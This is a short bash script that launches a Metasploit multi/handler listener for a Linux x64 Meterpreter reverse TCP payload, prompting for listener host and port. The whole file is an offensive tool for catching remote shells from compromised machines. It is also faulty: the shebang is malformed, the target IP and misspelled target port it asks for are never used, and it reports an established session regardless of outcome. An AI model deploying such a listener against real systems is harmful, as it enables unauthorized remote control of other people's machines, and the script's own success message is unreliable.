#/bin/bash
echo "target ip: "
read target_ip
echo "target port: "
read tatget_port

payload="linux/x64/meterpreter_reverse_tcp"
echo "lhost: "
read lhost
echo "lport: "
read lport

msfconsole -q << EOF
use exploit/multi/handler
set PAYLOAD $payload
set LHOST $lhost
set LPORT $lport
set ExitOnSession false
exploit -j
EOF

echo "Meterpreter session established."